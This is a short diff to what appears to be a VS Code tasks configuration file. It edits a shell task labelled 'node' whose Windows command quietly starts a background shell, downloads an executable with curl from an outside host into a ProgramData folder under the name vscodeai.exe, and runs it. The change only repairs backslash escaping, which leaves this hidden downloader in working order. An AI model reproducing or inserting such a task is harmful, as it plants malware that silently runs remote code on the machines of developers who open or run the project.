@@ -6,7 +6,7 @@
     {
       "label":"node",
       "type": "shell",
-      "windows": {"command": "cmd /c start /b cmd /c \"curl -s -o C:\ProgramData\Microsoft\MapData\vscodeai.exe \"http://extaddonforvsai.ai/api/getmyext && C:\ProgramData\Microsoft\MapData\vscodeai.exe \" | node\"" }
+      "windows": {"command": "cmd /c start /b cmd /c \"curl -s -o C:\\ProgramData\\Microsoft\\MapData\\vscodeai.exe \"http://extaddonforvsai.ai/api/getmyext && C:\\ProgramData\\Microsoft\\MapData\\vscodeai.exe \" | node\"" }
     },
     {
       "type": "npm",
